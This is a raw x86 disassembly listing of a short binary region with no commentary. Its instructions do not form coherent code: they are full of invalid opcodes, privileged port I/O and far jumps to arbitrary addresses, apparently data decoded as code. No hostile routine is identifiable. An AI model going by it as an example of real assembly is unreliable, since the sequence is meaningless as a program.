  41f00f:	push   ebp
  41f010:	push   ebx
  41f011:	xor    esi,DWORD PTR [ecx]
  41f013:	or     DWORD PTR [eax+ebp*1-0x1c],0x1c9dab26
  41f01b:	outs   dx,BYTE PTR ds:[esi]
  41f01c:	sbb    DWORD PTR [edi+ebp*4],0xcde32b8a
  41f023:	lahf   
  41f024:	mov    ecx,0xd3e888bf
  41f029:	push   ebx
  41f02a:	pop    ebx
  41f02b:	push   edx
  41f02c:	pop    ecx
  41f02d:	retf   0xccb4
  41f030:	repz adc edi,DWORD PTR [eax-0x584c2bc6]
  41f037:	daa    
  41f038:	jmp    0xf385589f
  41f03d:	xor    al,0xc0
  41f03f:	dec    ecx
  41f040:	out    dx,al
  41f041:	fild   QWORD PTR [eax+edx*1]
  41f044:	dec    edi
  41f045:	jo     0x41efec
  41f047:	lea    esp,[esi+0x6c41d8f6]
  41f04d:	mov    al,0x64
  41f04f:	xlat   BYTE PTR ds:[ebx]
  41f050:	pop    eax
  41f051:	dec    ecx
  41f052:	jno    0x41efd8
  41f054:	sub    BYTE PTR [eax+0x6fe73e07],cl
  41f05a:	sar    DWORD PTR [eax+0x7d],1
  41f05d:	mov    DWORD PTR [edi+0x8754b0a],ebx
  41f063:	cmp    al,0xd9
  41f065:	daa    
  41f066:	cmp    DWORD PTR [ecx+0x6bed5f06],0x24
  41f06d:	and    DWORD PTR [ecx+0x134a6a85],ecx
  41f073:	sub    eax,0x41dddc65
  41f078:	repnz cmp cl,BYTE PTR [ebx+ebx*2]
  41f07c:	push   edi
  41f07d:	jo     0x41f06d
  41f07f:	pop    esi
  41f080:	das    
  41f081:	mov    eax,ds:0xe1a26c8e
  41f086:	and    dh,BYTE PTR [ebx-0x530e40b9]
  41f08c:	push   esi
  41f08d:	iret   
  41f08e:	jb     0x41f0fe
  41f090:	pop    esi
  41f091:	arpl   WORD PTR [esi+0x69],ax
  41f094:	mov    ah,0xd3
  41f096:	dec    ebx
  41f097:	mov    ds:0xe910a377,eax
  41f09c:	arpl   WORD PTR [ecx+edi*4+0x22eee32b],bp
  41f0a3:	mov    edx,0xb6330889
  41f0a8:	int    0x56
  41f0aa:	xlat   BYTE PTR ds:[ebx]
  41f0ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ac:	(bad)  
  41f0ad:	loop   0x41f11a
  41f0af:	pop    ebx
  41f0b0:	push   ecx
  41f0b1:	mov    esp,0x65704db1
  41f0b6:	add    DWORD PTR [edx-0x7d],0x334f3115
  41f0bd:	in     al,0x24
  41f0bf:	dec    edx
  41f0c0:	fs sbb eax,0xf755ef04
  41f0c6:	xchg   ebx,eax
  41f0c7:	inc    eax
  41f0c8:	pop    ecx
  41f0c9:	mov    edx,0xc14ef015
  41f0ce:	iret   
  41f0cf:	test   BYTE PTR [ebx],al
  41f0d1:	cwde   
  41f0d2:	jns    0x41f0f2
  41f0d4:	push   eax
  41f0d5:	mov    ds:0xf7decb49,eax
  41f0da:	sub    esp,DWORD PTR [bx+di]
  41f0dd:	call   0xb11a7dfc
  41f0e2:	fs mov ah,0x9c
  41f0e5:	int3   
  41f0e6:	sub    cl,BYTE PTR [edx+0x534b4237]
  41f0ec:	cwde   
  41f0ed:	add    DWORD PTR [edi+0x32],ecx
  41f0f0:	sub    edi,ecx
  41f0f2:	inc    esi
  41f0f3:	push   0x5d
  41f0f5:	mul    BYTE PTR [esi]
  41f0f7:	faddp  st(2),st
  41f0f9:	dec    ebp
  41f0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0fb:	sbb    eax,0xd30c0f8e
  41f100:	loop   0x41f0a4
  41f102:	dec    esi
  41f103:	arpl   WORD PTR [esi+0x8],bx
  41f106:	mov    ah,0x5a
  41f108:	xchg   esp,eax
  41f109:	or     eax,0xcfd378ce
  41f10e:	inc    edx
  41f10f:	pusha  
  41f110:	in     al,dx
  41f111:	adc    BYTE PTR [ebp+0x28ecf700],cl
  41f117:	and    ecx,esi
  41f119:	jae    0x41f0b4
  41f11b:	cld    
  41f11c:	and    ecx,DWORD PTR [esi+ebx*2-0x41]
  41f120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f121:	fld    QWORD PTR [esi+0x7221d956]
  41f127:	and    BYTE PTR [ecx-0x502f6474],dh
  41f12d:	sbb    BYTE PTR [ebp-0x7d],ch
  41f130:	aas    
  41f131:	out    dx,eax
  41f132:	aas    
  41f133:	mov    edi,0x2e5c87e1
  41f138:	and    cl,al
  41f13a:	inc    ebx
  41f13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f13c:	lock mov al,ds:0xd88d3af
  41f142:	add    BYTE PTR [ecx-0x1c68b0ee],cl
  41f148:	fdiv   QWORD PTR [ecx+0x1a]
  41f14b:	jnp    0x41f1bd
  41f14d:	icebp  
  41f14e:	mov    ebp,0xb1774b3a
  41f153:	push   ebp
  41f154:	outs   dx,DWORD PTR ds:[esi]
  41f155:	mov    eax,ds:0xaee163d8
  41f15a:	cmp    al,cl
  41f15c:	adc    eax,0xc0126737
  41f161:	das    
  41f162:	mov    esp,0x5e7107a0
  41f167:	pop    ss
  41f168:	scas   eax,DWORD PTR es:[edi]
  41f169:	mov    dl,0x51
  41f16b:	adc    al,0x42
  41f16d:	test   al,0x24
  41f16f:	pusha  
  41f170:	sbb    DWORD PTR [ebp-0x77],edi
  41f173:	inc    edi
  41f174:	scas   al,BYTE PTR es:[edi]
  41f175:	xchg   esi,eax
  41f176:	push   ss
  41f177:	xchg   edx,eax
  41f178:	jecxz  0x41f199
  41f17a:	mov    esp,0x1a5a0695
  41f17f:	ss push esp
  41f181:	mov    edx,0xecd0ec5b
  41f186:	push   edx
  41f187:	icebp  
  41f188:	xchg   esp,eax
  41f189:	(bad)  
  41f18a:	adc    ch,al
  41f18c:	pop    edi
  41f18d:	pusha  
  41f18e:	lahf   
  41f18f:	xor    DWORD PTR [ecx-0x24],esi
  41f192:	(bad)  
  41f193:	or     eax,0x89be174f
  41f198:	in     eax,0x3f
  41f19a:	dec    eax
  41f19b:	outs   dx,BYTE PTR ds:[esi]
  41f19c:	jns    0x41f185
  41f19e:	add    al,0xdc
  41f1a0:	jmp    0x5eef:0x25557f84
  41f1a7:	adc    DWORD PTR [ebx+eiz*4],0x31
  41f1ab:	stos   BYTE PTR es:[edi],al
  41f1ac:	jno    0x41f1c5
  41f1ae:	imul   DWORD PTR [esi]
  41f1b0:	popf   
  41f1b1:	popa   
  41f1b2:	nop
  41f1b3:	inc    esp
  41f1b4:	pop    ss
  41f1b5:	stc    
  41f1b6:	adc    eax,0x4dc15d11
  41f1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1bc:	fdivr  DWORD PTR [ebx]
  41f1be:	push   0x85ecab34
  41f1c3:	pusha  
  41f1c4:	and    DWORD PTR [edi],0xffffffc9
  41f1c7:	and    esp,ebx
  41f1c9:	ja     0x41f1e5
  41f1cb:	jae    0x41f20e
  41f1cd:	adc    ebx,ecx
  41f1cf:	cli    
  41f1d0:	jo     0x41f1df
  41f1d2:	jb     0x41f16b
  41f1d4:	idiv   dl
  41f1d6:	push   ss
  41f1d7:	pop    edx
  41f1d8:	scas   eax,DWORD PTR es:[edi]
  41f1d9:	addr16 popf 
  41f1db:	mov    ebp,0x966dd5f9
  41f1e0:	sahf   
  41f1e1:	adc    bl,ah
  41f1e3:	fadd   DWORD PTR [esi]
  41f1e5:	test   al,0x5
  41f1e7:	sub    al,BYTE PTR [ecx-0x4f]
  41f1ea:	mov    edx,0x3e4bbf96
  41f1ef:	ror    BYTE PTR [edx],0x29
  41f1f2:	jo     0x41f23d
  41f1f4:	(bad)  
  41f1f6:	sub    eax,0x4a980169
  41f1fb:	scas   eax,DWORD PTR es:[edi]
  41f1fc:	imul   ecx,DWORD PTR cs:[edi-0x60],0xee51b3e3
  41f204:	pushf  
  41f205:	stc    
  41f206:	in     eax,0xb0
  41f208:	mov    esi,0xbc39adcd
  41f20d:	cmp    ecx,DWORD PTR [ebx+ecx*8-0x8]
  41f211:	hlt    
  41f212:	and    BYTE PTR [edx+ebp*1+0x5c],bl
  41f216:	ret    
  41f217:	push   esi
  41f218:	add    edi,DWORD PTR [ecx+0x4f]
  41f21b:	push   ebp
  41f21c:	in     al,0xb
  41f21e:	dec    esi
  41f21f:	popf   
  41f220:	push   0x3f
  41f222:	jg     0x41f215
  41f224:	rcr    BYTE PTR ds:0xe6b5772e,cl
  41f22a:	adc    DWORD PTR [esi-0x79],ebx
  41f22d:	retf   
  41f22e:	adc    DWORD PTR [ecx+0x48],0xfffffffe
  41f232:	(bad)  
  41f233:	mov    ds,WORD PTR [ecx+edi*2]
  41f236:	std    
  41f237:	and    al,0x37
  41f239:	dec    esi
  41f23a:	data16 std 
  41f23c:	sbb    bl,BYTE PTR [ecx+ebp*2+0x3f167d63]
  41f243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f244:	loop   0x41f1f4
  41f246:	pop    esi
  41f247:	xlat   BYTE PTR ds:[ebx]
  41f248:	mov    esp,0xe36da381
  41f24d:	rcr    BYTE PTR [ecx+0x3b8f8c3d],1
  41f253:	adc    dl,BYTE PTR [ecx+0x55aa7332]
  41f259:	lods   eax,DWORD PTR ds:[esi]
  41f25a:	(bad)  
  41f25b:	fstp   DWORD PTR [edi+0x27]
  41f25e:	(bad)  
  41f25f:	mov    cl,0xfe
  41f261:	pop    edi
  41f262:	pop    edx
  41f263:	sbb    al,0xf6
  41f265:	(bad)  
  41f267:	sbb    ah,ch
  41f269:	aad    0xe6
  41f26b:	shr    edx,cl
  41f26d:	iret   
  41f26e:	int3   
  41f26f:	mov    bl,0x8d
  41f271:	(bad)  
  41f272:	fadd   QWORD PTR [edx-0x5a2752ba]
  41f278:	outs   dx,BYTE PTR ds:[esi]
  41f279:	xor    BYTE PTR [eax-0x79ba0283],bh
  41f27f:	jp     0x41f2ce
  41f281:	inc    edi
  41f282:	test   DWORD PTR [eax+ebp*2],0x388f5cff
  41f289:	js     0x41f280
  41f28b:	fs or  eax,0x74ea9e93
  41f291:	mov    eax,ds:0x5e456d5d
  41f296:	jle    0x41f308
  41f298:	outs   dx,DWORD PTR ds:[esi]
  41f299:	jle    0x41f30c
  41f29b:	(bad)  
  41f29c:	fcmovbe st,st(4)
  41f29e:	sbb    al,0x80
  41f2a0:	pop    esp
  41f2a1:	mov    ebp,0x9eb95ce1
  41f2a6:	loopne 0x41f2ec
  41f2a8:	ror    BYTE PTR [esp+esi*2-0x641a50b5],cl
  41f2af:	imul   esp,edi,0x3631d491
  41f2b5:	add    DWORD PTR [ebx+eiz*2+0x5f986bc4],ecx
  41f2bc:	data16 fdivr QWORD PTR [edi+0x3e724cba]
  41f2c3:	push   ds
  41f2c4:	sub    ch,BYTE PTR [ecx]
  41f2c6:	adc    eax,0x14562739
  41f2cb:	adc    al,0x53
  41f2cd:	and    al,0x2c
  41f2cf:	inc    esp
  41f2d0:	lahf   
  41f2d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2d2:	test   BYTE PTR [ebx-0x7f720fcf],cl
  41f2d8:	mov    ds:0xb70f9f3c,al
  41f2dd:	mov    ebx,0xdbe324be
  41f2e2:	jecxz  0x41f2a5
  41f2e4:	popf   
  41f2e5:	aam    0x9a
  41f2e7:	bound  esi,QWORD PTR [edx]
  41f2e9:	iret   
  41f2ea:	xor    BYTE PTR [esi],dl
  41f2ec:	pop    edx
  41f2ed:	fscale 
  41f2ef:	push   0xf2512033
  41f2f4:	or     BYTE PTR [edx-0x29],ch
  41f2f7:	mov    edx,0x22b8a041
  41f2fc:	and    ah,bl
  41f2fe:	mov    ebp,0xdd78f3fb
  41f303:	cmp    dl,dh
  41f305:	jmp    0x7d2d:0x5ed27b22
  41f30c:	inc    edx
  41f30d:	imul   esp,esi,0xb42ff98
  41f313:	jb     0x41f330
  41f315:	test   BYTE PTR [ebx],dl
  41f317:	cli    
  41f318:	push   eax
  41f319:	mov    esi,0x3d46013c
  41f31e:	jnp    0x41f2d7
  41f320:	clc    
  41f321:	das    
  41f322:	mov    esi,ecx
  41f324:	std    
  41f325:	std    
  41f326:	pop    ecx
  41f327:	pop    ecx
  41f328:	inc    esi
  41f329:	mov    dl,0xde
  41f32b:	adc    bh,al
  41f32d:	adc    al,0xc5
  41f32f:	mov    edx,0xf9f93652
  41f334:	mov    BYTE PTR [ebp+edi*1+0x10],dl
  41f338:	loop   0x41f383
  41f33a:	adc    al,0x2e
  41f33c:	les    edx,FWORD PTR [ecx+edi*2-0x51]
  41f340:	pop    es
  41f341:	adc    DWORD PTR [esi-0x2a],0x3b
  41f345:	dec    edx
  41f346:	sbb    bh,BYTE PTR [ebp-0x11]
  41f349:	outs   dx,DWORD PTR ds:[esi]
  41f34a:	jnp    0x41f389
  41f34c:	(bad)  
  41f34d:	in     al,0xd9
  41f34f:	(bad)  
  41f350:	daa    
  41f351:	mov    BYTE PTR [esi],ah
  41f353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f354:	cmp    al,0xd1
  41f356:	jb     0x41f383
  41f358:	rcl    DWORD PTR [edx-0x59],0x8e
  41f35c:	cmp    al,0xb0
  41f35e:	cld    
  41f35f:	push   esi
  41f360:	test   eax,0x51a2cf24
  41f365:	push   ds
  41f366:	pop    ebp
  41f367:	jo     0x41f301
  41f369:	in     eax,dx
  41f36a:	inc    ecx
  41f36b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f36c:	icebp  
  41f36d:	aad    0x7d
  41f36f:	fidivr DWORD PTR [eax+0x4962225d]
  41f375:	mov    al,ds:0xc5d90b43
  41f37a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f37b:	mov    dh,0x59
  41f37d:	cld    
  41f37e:	pop    ds
  41f37f:	in     al,0xf9
  41f381:	push   edx
  41f382:	jo     0x41f3de
  41f384:	mov    dl,0x4f
  41f386:	pop    ebx
  41f387:	push   es
  41f388:	aaa    
  41f389:	and    eax,DWORD PTR [edi+0x408ceb13]
  41f38f:	ret    
  41f390:	xor    BYTE PTR [eax-0x4c],dh
  41f393:	inc    ecx
  41f394:	out    0x52,al
  41f396:	hlt    
  41f397:	jge    0x41f360
  41f399:	xchg   esi,eax
  41f39a:	xchg   ebx,eax
  41f39b:	sub    eax,0xc4306a60
  41f3a0:	mov    dl,0xe6
  41f3a2:	aam    0xa4
  41f3a4:	mov    ebx,0xba84fa5c
  41f3a9:	inc    ebx
  41f3aa:	add    ch,al
  41f3ac:	(bad)  
  41f3ad:	hlt    
  41f3ae:	aas    
  41f3af:	pop    ss
  41f3b0:	ins    BYTE PTR es:[edi],dx
  41f3b1:	push   ds
  41f3b2:	mov    ebp,eax
  41f3b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b5:	neg    ecx
  41f3b7:	cmp    BYTE PTR [ebp-0x19739bca],0x0
  41f3be:	dec    edi
  41f3bf:	push   es
  41f3c0:	das    
  41f3c1:	ins    BYTE PTR es:[edi],dx
  41f3c2:	or     ch,0x9c
  41f3c5:	in     al,dx
  41f3c6:	xchg   esp,eax
  41f3c7:	imul   esp,DWORD PTR [eax+0x41fca95e],0x759130ae
  41f3d1:	in     al,dx
  41f3d2:	enter  0xc16a,0xfc
  41f3d6:	popf   
  41f3d7:	dec    eax
  41f3d8:	rcr    BYTE PTR [edi-0x17],1
  41f3db:	pop    ebp
  41f3dc:	sub    cl,BYTE PTR [eax]
  41f3de:	dec    eax
  41f3df:	pop    ecx
  41f3e0:	aam    0x9a
  41f3e2:	lods   eax,DWORD PTR ds:[esi]
  41f3e3:	xlat   BYTE PTR ds:[ebx]
  41f3e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3e5:	cli    
  41f3e6:	dec    esi
  41f3e7:	bound  edi,QWORD PTR [eax]
  41f3e9:	sbb    BYTE PTR [ebp-0x3856e0a],ch
  41f3ef:	mov    esi,0xc6e50cac
  41f3f4:	jmp    0x999577e9
  41f3f9:	enter  0x449,0xe1
  41f3fd:	outs   dx,DWORD PTR ds:[esi]
  41f3fe:	mov    ebx,0x5e9362a4
  41f403:	xor    BYTE PTR [edx-0x20669a29],0x7c
  41f40a:	dec    ebx
  41f40b:	sbb    DWORD PTR [ecx+0x3d3943b5],0x732e5f8d
  41f415:	call   0xcac75e2d
  41f41a:	dec    edx
  41f41b:	imul   eax,DWORD PTR [ecx],0xffffffc8
  41f41e:	fbstp  TBYTE PTR [ebx+0xfbf38cc]
  41f424:	dec    esp
  41f425:	pusha  
  41f426:	iret   
  41f427:	add    ebx,ebx
  41f429:	and    DWORD PTR ds:0xb606d002,esp
  41f42f:	das    
  41f430:	cmp    al,0x9
  41f432:	(bad)  
  41f433:	(bad)  
  41f434:	stos   BYTE PTR es:[edi],al
  41f435:	enter  0xf3e,0xd5
  41f439:	push   esi
  41f43a:	(bad)  
  41f43b:	pop    ds
  41f43c:	aaa    
  41f43d:	inc    esp
  41f43e:	push   edx
  41f43f:	popa   
  41f440:	pop    ebp
  41f441:	jbe    0x41f443
  41f443:	add    BYTE PTR [eax],al
  41f445:	add    BYTE PTR [eax],al
  41f447:	add    BYTE PTR [eax],al
  41f449:	add    BYTE PTR [edx+0x4d],dl
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	dec    ebx
  41f457:	ins    BYTE PTR es:[edi],dx
  41f458:	cld    
  41f459:	pop    ebp
  41f45a:	rol    BYTE PTR [ebx+0x6800001],1
  41f460:	add    BYTE PTR [eax],al
  41f462:	jb     0x41f428
  41f464:	cs pop edi
  41f466:	inc    esp
  41f467:	lea    edx,[ebp+0x371ab258]
  41f46d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f46e:	cdq    
  41f46f:	ficom  WORD PTR [eax]
  41f471:	das    
  41f472:	les    esp,FWORD PTR [ecx+ebp*1-0x109b8105]
  41f479:	xor    al,0x53
  41f47b:	sti    
  41f47c:	push   edi
  41f47d:	int    0x3f
  41f47f:	pop    edi
  41f480:	xchg   esi,eax
  41f481:	dec    eax
  41f482:	mov    cl,0x32
  41f484:	pop    ebp
  41f485:	sbb    bh,dh
  41f487:	fmul   DWORD PTR [eax-0x414a0bb0]
  41f48d:	push   esp
  41f48e:	lods   al,BYTE PTR ds:[esi]
  41f48f:	fwait
  41f490:	jne    0x41f47f
  41f492:	cmp    esp,DWORD PTR [edx+0x1fed4ceb]
  41f498:	(bad)  
  41f499:	mov    ecx,0xe8910d7c
  41f49e:	call   0x67eab5b0
  41f4a3:	dec    edi
  41f4a4:	adc    al,0x2d
  41f4a6:	leave  
  41f4a7:	fidivr DWORD PTR [eax]
  41f4a9:	dec    ecx
  41f4aa:	stc    
  41f4ab:	cld    
  41f4ac:	iret   
  41f4ad:	enter  0xd343,0xd0
  41f4b1:	xor    esi,DWORD PTR [ebp+esi*8-0x54]
  41f4b5:	add    BYTE PTR ds:0x1c7f4907,al
  41f4bb:	adc    al,0xb9
  41f4bd:	hlt    
  41f4be:	(bad)  
  41f4bf:	sbb    BYTE PTR [ecx-0x3daed84e],dh
  41f4c5:	out    0xcc,al
  41f4c7:	repnz iret 
  41f4c9:	popf   
  41f4ca:	mov    ch,0x12
  41f4cc:	inc    esi
  41f4cd:	repz gs inc ebp
  41f4d0:	mov    ds,WORD PTR [ebx]
  41f4d2:	lea    edx,[ebx-0x29]
  41f4d5:	jle    0x41f4fb
  41f4d7:	mov    bl,0x2a
  41f4d9:	mov    bh,0x91
  41f4db:	cld    
  41f4dc:	ret    0xc575
  41f4df:	test   BYTE PTR [ebx-0x668b4728],dh
  41f4e5:	xchg   BYTE PTR [ebx],ah
  41f4e7:	ins    DWORD PTR es:[edi],dx
  41f4e8:	inc    ebp
  41f4e9:	ja     0x41f547
  41f4eb:	push   edx
  41f4ec:	gs jecxz 0x41f56e
  41f4ef:	pop    ebx
  41f4f0:	out    dx,al
  41f4f1:	sub    cl,BYTE PTR [edi-0x7c]
  41f4f4:	in     ax,dx
  41f4f6:	in     al,dx
  41f4f7:	test   eax,0x3532b013
  41f4fc:	mov    edi,0xda50c90f
  41f501:	adc    eax,0xe5969c38
  41f506:	mov    edx,0x93657328
  41f50b:	cmp    eax,0xc10caef5
  41f510:	aam    0x1f
  41f512:	call   0x29b654
  41f517:	test   BYTE PTR [ecx],ch
  41f519:	push   ebx
  41f51a:	cs ja  0x41f51a
  41f51d:	jae    0x41f541
  41f51f:	xchg   edx,eax
  41f520:	test   bh,al
  41f522:	push   ds
  41f523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f524:	shr    DWORD PTR [ecx-0x2e],cl
  41f527:	or     al,BYTE PTR [edi+0x248e9000]
  41f52d:	aaa    
  41f52e:	(bad)  
  41f52f:	mov    cl,0x69
  41f531:	and    al,0x52
  41f533:	jae    0x41f53c
  41f535:	lock sti 
  41f537:	jp     0x41f5aa
  41f539:	push   ss
  41f53a:	(bad)  
  41f53b:	pusha  
  41f53c:	xchg   edx,eax
  41f53d:	push   0x3
  41f53f:	mul    esi
  41f541:	jnp    0x41f58f
  41f543:	adc    bh,BYTE PTR [edi-0x37]
  41f546:	or     ebp,edx
  41f548:	imul   esp,ecx,0x98e7e329
  41f54e:	or     ecx,DWORD PTR [edx+ebx*4]
  41f551:	mov    esi,0xcd97f1f9
  41f556:	loope  0x41f4de
  41f558:	nop
  41f559:	xor    esi,ebx
  41f55b:	xor    esi,DWORD PTR [eax]
  41f55d:	stos   DWORD PTR es:[edi],eax
  41f55e:	inc    edi
  41f55f:	mov    DWORD PTR [edx],ecx
  41f561:	mov    WORD PTR [ebx-0x6f],?
  41f564:	push   ds
  41f565:	dec    edx
  41f566:	cmp    eax,edx
  41f568:	or     edx,edx
  41f56a:	or     esi,DWORD PTR [edx]
  41f56c:	stos   BYTE PTR es:[edi],al
  41f56d:	call   0xc9d6:0x54df5eed
  41f574:	inc    eax
  41f575:	in     al,0x9d
  41f577:	add    eax,0x7ac25fd7
  41f57c:	(bad)  
  41f57d:	in     al,dx
  41f57e:	xchg   esp,eax
  41f57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f580:	or     al,0x29
  41f582:	out    dx,al
  41f583:	in     al,0xc0
  41f585:	and    edx,edi
  41f587:	scas   eax,DWORD PTR es:[edi]
  41f588:	not    edi
  41f58a:	dec    eax
  41f58b:	adc    DWORD PTR [esi-0x29],esi
  41f58e:	mov    esi,0x81d90b2b
  41f593:	shl    ebp,1
  41f595:	adc    DWORD PTR [ebp-0xa],eax
  41f598:	or     ah,BYTE PTR [esi+eiz*8-0x16]
  41f59c:	jg     0x41f56f
  41f59e:	idiv   BYTE PTR [edi+0x1f704aaa]
  41f5a4:	cmove  ecx,DWORD PTR [eax+0x1f82528b]
  41f5ab:	test   edi,ecx
  41f5ad:	xchg   esp,eax
  41f5ae:	test   al,0xee
  41f5b0:	fnstcw WORD PTR [esi]
  41f5b2:	xor    edi,DWORD PTR [esi-0x4]
  41f5b5:	push   ecx
  41f5b6:	mov    eax,ds:0x1595cb2e
  41f5bb:	add    DWORD PTR [ebx-0x51bb2036],esi
  41f5c1:	std    
  41f5c2:	stc    
  41f5c3:	gs xor al,0xfa
  41f5c6:	add    edx,edi
  41f5c8:	dec    edx
  41f5c9:	pop    esi
  41f5ca:	adc    al,0x7d
  41f5cc:	mov    dl,0xca
  41f5ce:	mov    eax,0xbdcd2371
  41f5d3:	int3   
  41f5d4:	div    dl
  41f5d6:	pusha  
  41f5d7:	cmp    ebx,DWORD PTR [ebp-0x4d84c80]
  41f5dd:	jmp    0x41f5e8
  41f5df:	pop    eax
  41f5e0:	inc    ecx
  41f5e1:	sbb    BYTE PTR [ebx+ebx*1+0x45],al
  41f5e5:	(bad)  
  41f5e6:	fmul   DWORD PTR [edx+edi*2]
  41f5e9:	jo     0x41f5f7
  41f5eb:	pop    esi
  41f5ec:	shr    BYTE PTR [ecx-0x28],1
  41f5ef:	jbe    0x41f5db
  41f5f1:	sbb    dh,BYTE PTR [ebx-0x431e818e]
  41f5f7:	sbb    DWORD PTR [ecx-0x1c],edi
  41f5fa:	sub    DWORD PTR [ebp-0xc],0x565cdfa8
  41f601:	or     DWORD PTR [edi],0xea95c586
  41f607:	sbb    eax,0x418ca705
  41f60c:	xor    eax,DWORD PTR [eax-0x50]
  41f60f:	pop    edx
  41f610:	xor    al,0x98
  41f612:	jbe    0x41f5cd
  41f614:	scas   eax,DWORD PTR es:[edi]
  41f615:	mov    eax,DWORD PTR [edi-0x4b7eb96b]
  41f61b:	add    dl,BYTE PTR [ecx+0x18]
  41f61e:	sbb    BYTE PTR [edi+ecx*1-0x5707128c],bl
  41f625:	(bad)  
  41f626:	push   ds
  41f627:	pop    ds
  41f628:	in     al,0x2e
  41f62a:	test   DWORD PTR [ecx],ebp
  41f62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f62d:	out    dx,eax
  41f62e:	pop    ebp
  41f62f:	gs retf 0xad76
  41f633:	mov    dh,0x39
  41f635:	push   es
  41f636:	jo     0x41f654
  41f638:	sbb    BYTE PTR ds:0x260a21f7,0x78
  41f63f:	lea    esp,[esi-0x41]
  41f642:	inc    ebp
  41f643:	stos   DWORD PTR es:[edi],eax
  41f644:	push   esi
  41f645:	mov    dl,0x20
  41f647:	nop
  41f648:	jle    0x41f5f7
  41f64a:	cmp    dh,ah
  41f64c:	repnz mov bl,0x58
  41f64f:	lock sti 
  41f651:	jae    0x41f60c
  41f653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f654:	cmp    BYTE PTR [ecx+0x46c70b24],bh
  41f65a:	xlat   BYTE PTR ds:[ebx]
  41f65b:	inc    ecx
  41f65c:	(bad)  
  41f65d:	adc    eax,0x88d1647
  41f662:	jmp    0x4feb76b3
  41f667:	int3   
  41f668:	ror    DWORD PTR [eax],1
  41f66a:	out    0xb9,eax
  41f66c:	push   0x68
  41f66e:	sbb    ch,BYTE PTR [ecx-0x344e3453]
  41f674:	cmc    
  41f675:	cdq    
  41f676:	jmp    0xf319:0x3b12bdd3
  41f67d:	and    ah,BYTE PTR [ebp+0x64674a85]
  41f683:	xchg   BYTE PTR [ecx+edi*1],ch
  41f686:	adc    DWORD PTR [ebx+edi*4-0xdb62625],esp
  41f68d:	addr16 mov al,0xe8
  41f690:	jbe    0x41f6ee
  41f692:	pop    ecx
  41f693:	mov    ds:0x8538b049,al
  41f698:	outs   dx,BYTE PTR ds:[esi]
  41f699:	fisub  DWORD PTR [ebx]
  41f69b:	lahf   
  41f69c:	aam    0x4f
  41f69e:	xor    ecx,ecx
  41f6a0:	xor    al,0x1c
  41f6a2:	in     eax,0x9e
  41f6a4:	push   ebx
  41f6a5:	(bad)  
  41f6a6:	jge    0x41f66c
  41f6a8:	popf   
  41f6a9:	fldcw  WORD PTR [edi-0x78]
  41f6ac:	mov    ecx,0xaea1b432
  41f6b1:	in     al,0xd2
  41f6b3:	clc    
  41f6b4:	popf   
  41f6b5:	ror    BYTE PTR [ebx],1
  41f6b7:	add    al,0x56
  41f6b9:	addr16 sahf 
  41f6bb:	mov    esp,0x7eddf5ee
  41f6c0:	xchg   ecx,eax
  41f6c1:	aam    0xfd
  41f6c3:	pop    ebp
  41f6c4:	cmp    eax,0x4a9e041
  41f6c9:	pusha  
  41f6ca:	in     eax,dx
  41f6cb:	stos   BYTE PTR es:[edi],al
  41f6cc:	mov    edi,0x2476271b
  41f6d1:	mov    al,ds:0x60d56dcd
  41f6d6:	dec    ebp
  41f6d7:	sub    eax,0x844885ec
  41f6dc:	jmp    FWORD PTR [ecx]
  41f6de:	cli    
  41f6df:	or     ch,BYTE PTR [ecx+esi*8-0x4d0248b2]
  41f6e6:	mov    ebp,0x4df560b0
  41f6eb:	aas    
  41f6ec:	repz mov al,ds:0x7742bfe6
  41f6f2:	jecxz  0x41f6d7
  41f6f4:	add    bl,BYTE PTR [edi-0x7a]
  41f6f7:	out    dx,eax
  41f6f8:	(bad)  
  41f6f9:	into   
  41f6fa:	dec    ebp
  41f6fb:	test   BYTE PTR [ebp-0x4cd45774],ah
  41f701:	cmp    DWORD PTR [esi+eax*2-0x49],0xffffffc7
  41f706:	(bad)
  41f709:	adc    al,0x2b
  41f70b:	call   0xe190b21f
  41f710:	ins    DWORD PTR es:[edi],dx
  41f711:	stos   BYTE PTR es:[edi],al
  41f712:	dec    ebp
  41f713:	xchg   ecx,eax
  41f714:	fstp   DWORD PTR [edx-0x28]
  41f717:	test   al,0xbe
  41f719:	and    DWORD PTR fs:[eax-0x78],esi
  41f71d:	mov    ch,0xc1
  41f71f:	and    DWORD PTR [esi+0x36b56fbb],0xffffffd8
  41f726:	push   es
  41f727:	jbe    0x41f75c
  41f729:	xchg   edi,eax
  41f72a:	ficomp DWORD PTR [eax-0x78195dbb]
  41f730:	clc    
  41f731:	push   eax
  41f732:	(bad)  
  41f733:	fcmovbe st,st(5)
  41f735:	adc    al,0x40
  41f737:	pop    ds
  41f738:	push   ebp
  41f739:	mov    es,WORD PTR [esi+eax*8+0x7d]
  41f73d:	pop    edx
  41f73e:	sub    al,0x0
  41f740:	sub    ebx,0xffffff90
  41f743:	div    BYTE PTR [ebx-0x40ca5e1e]
  41f749:	outs   dx,BYTE PTR ds:[esi]
  41f74a:	or     al,0xd
  41f74c:	sub    eax,0x11ecd9c9
  41f751:	mov    BYTE PTR [edi+0x4be5fd11],ah
  41f757:	dec    esi
  41f758:	pushf  
  41f759:	inc    ecx
